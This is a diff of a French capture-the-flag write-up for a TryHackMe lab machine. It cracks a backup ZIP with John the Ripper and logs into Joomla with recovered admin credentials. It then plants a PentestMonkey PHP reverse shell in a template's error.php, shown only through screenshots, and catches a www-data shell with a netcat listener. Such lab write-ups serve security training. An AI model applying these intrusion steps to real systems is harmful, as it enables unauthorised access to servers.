@@ -282,10 +282,9 @@ Dans les deux cas, nous détectons la présence d'un répertoire '**/administrat
 
 Téléchargeons le fichier **backup.zip** et attaquons-le avec **John The Ripper**
 
-#### backup.zip
-
 ```
-zip2john backup.zip > backup2john.txt
+┌──(kali㉿kali)-[~/THM/joker]
+└─$ zip2john backup.zip > backup2john.txt
 ```
 
 ```
@@ -301,11 +300,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+Decompressons backup.zip localement
+
 <figure><img src=".gitbook/assets/extract_here.png" alt=""><figcaption><p>Backup.zip extract here</p></figcaption></figure>
 
 <figure><img src=".gitbook/assets/backup_zip_password.png" alt="" width="375"><figcaption><p>Backup.zip password</p></figcaption></figure>
-
-#### Joomla
 
 Après avoir extrait le fichier backup.zip, intéressons-nous au **fichier joomladb.sql trouvé dans le sous-répertoire backup/db**&#x20;
 
@@ -365,3 +364,36 @@ Nous pouvons désormais répondre à toute une série de questions et toutes ces
 Passons à l'exploitation des données récoltées pour prendre pied dans la machine cible.
 
 Commençons par nous connecter à Joomla avec les crédentiels **admin:abcd1234**.
+
+<figure><img src=".gitbook/assets/administrator_login.png" alt=""><figcaption><p>administrator login</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/administrator_main (1).png" alt=""><figcaption><p>joomla control panel</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/beez3_style.png" alt=""><figcaption><p>Beez3 style page</p></figcaption></figure>
+
+
+
+<figure><img src=".gitbook/assets/beez3_customise.png" alt=""><figcaption><p>template customisation</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/reverse_shell.png" alt=""><figcaption><p>reverse shell PentestMonkey</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/beez3_reverseshell_ error_php.png" alt=""><figcaption><p>reverse shell paste dans error.php</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/firefox_reverseshell.png" alt=""><figcaption><p>reverse shell firefox</p></figcaption></figure>
+
+```
+┌──(kali㉿kali)-[~/THM/joker]
+└─$ nc -lvnp 12345
+listening on [any] 12345 ...
+connect to [10.9.1.183] from (UNKNOWN) [10.10.238.221] 44882
+Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 02:28:14 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
+bash: cannot set terminal process group (617): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
+www-data@ubuntu:/$  
+```
